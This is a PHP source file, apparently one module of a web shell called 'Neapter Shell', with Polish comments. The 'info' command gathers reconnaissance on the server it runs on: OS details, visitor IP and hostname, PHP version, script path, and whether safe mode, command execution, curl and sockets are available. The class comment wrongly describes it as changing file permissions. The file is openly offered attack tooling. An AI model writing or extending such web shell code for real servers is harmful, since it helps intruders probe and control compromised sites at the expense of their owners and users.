<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Zmienianie uprawnien dla pliku
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleInfo extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array('info');
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
info - Wyświetla informacje o systemie

    Użycie:
        info
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        return sprintf("SERVER:[%s], IP:[%s], Host:[%s]\r\nPHP:[%s], API:[%s], Url:[%s], Path:[%s]\r\nSAFE_MODE:[%d], EXE:[%d], CURL:[%d], SOCKET:[%d]",
            php_uname(),
            ($sIp = Request::getServer('REMOTE_ADDR')),
            @gethostbyaddr($sIp),
            PHP_VERSION,
            php_sapi_name(),
            ((PHP_SAPI === 'cli') ? 'CLI' : Request::getCurrentUrl()),
            ((PHP_SAPI === 'cli') ? Request::getServer('PWD') . '/' : '') . Request::getServer('SCRIPT_FILENAME'),
            $this->oUtils->isSafeMode(),
            $this->oUtils->isExecutable(),
            function_exists('curl_init'),
            function_exists('socket_create')
        );
    }

}
